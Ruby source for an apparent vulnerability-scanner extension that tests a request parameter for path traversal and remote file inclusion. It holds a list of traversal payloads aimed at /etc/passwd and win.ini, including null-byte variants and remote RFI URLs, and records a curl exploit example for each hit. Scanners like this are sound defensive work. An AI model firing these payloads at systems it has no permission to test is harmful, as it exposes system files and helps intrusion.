require 'cgi'

module ScannerExtensions
  module Extensions
    class PtravDetect < BaseExtension
      def initialize
        @type                = :detect
        @general_object_type = :param
        @extension_type      = :vuln
        @detect_type         = [:ptrav, :redir]

        @defaults = {
          timeout: 15
        }

        @files = {
          # always check for RFI first
          rfi_0: {
            request: 'http://wallarm.tools/rfi',
            rfi: true,
            templates: [
              /root:[^:]+:[0-9]+:[0-9]+.*/
            ]
          },
          rfi_1: {
            request: 'http://wallarm.tools/rfi.php',
            rfi: true,
            templates: [
              /root:[^:]+:[0-9]+:[0-9]+.*/
            ]
          },
          rfi_2: {
            request: 'http://wallarm.tools/rfi_location.php',
            rfi: true,
            templates: [
              /root:[^:]+:[0-9]+:[0-9]+.*/
            ]
          },
          unix1: {
            request: 'file:///etc/passwd',
            templates: [
              /root:[^:]+:[0-9]+:[0-9]+.*/
            ]
          },
          unix2: {
            request: '/etc/passwd',
            templates: [
              /root:[^:]+:[0-9]+:[0-9]+.*/
            ]
          },
          unix3: {
            request: "/etc/passwd\x00",
            templates: [
              /root:[^:]+:[0-9]+:[0-9]+.*/
            ]
          },
          unix4: {
            request: '/etc/passwd%00',
            templates: [
              /root:[^:]+:[0-9]+:[0-9]+.*/
            ]
          },
          unix5: {
            request: '/..' * 20 + '/etc/passwd',
            templates: [
              /root:[^:]+:[0-9]+:[0-9]+.*/
            ]
          },
          unix6: {
            request: '/..' * 20 + "/etc/passwd\x00",
            templates: [
              /root:[^:]+:[0-9]+:[0-9]+.*/
            ]
          },
          unix7: {
            request: '/..' * 20 + '/etc/passwd%00',
            templates: [
              /root:[^:]+:[0-9]+:[0-9]+.*/
            ]
          },
          windows: {
            request: '\..' * 20 + '\WINDOWS\win.ini',
            templates: [
              /\[fonts\]/,
              /\[extensions\]/
            ]
          }
        }

        @regexps = @files.each_value.map { |v| v[:templates] }.to_a.flatten
      end

      def run(object, params)
        params = @defaults.merge(params)
        return unless ScannerExtensions::Helpers::StableCheck.check(object, params, @regexps)

        @files.each_value do |v|
          rfi  = v[:rfi]
          file = v[:request]
          resp = object.http(
            value: file,
            timeout: params[:timeout],
            open_timeout: params[:open_timeout]
          )
          next if resp.nil?
          next if resp.body.nil?
          body = resp.body.normalize_enconding
          vuln = true
          data = nil
          v[:templates].each do |r|
            vuln = false if r !~ body
            data = body.scan(r)
            data = data.flatten.join(' ... ')
          end
          next unless vuln
          curl = object.curl_helper(
            value: file,
            resp: data
          )
          object.vuln(
            extension: 'ptrav_detect',
            template:  (rfi ? '/rfi' : '/ptrav'),
            binding: :protocol,
            args: {
              exploit_example: curl
            }
          )
          return
        end
      end
    end
  end
end
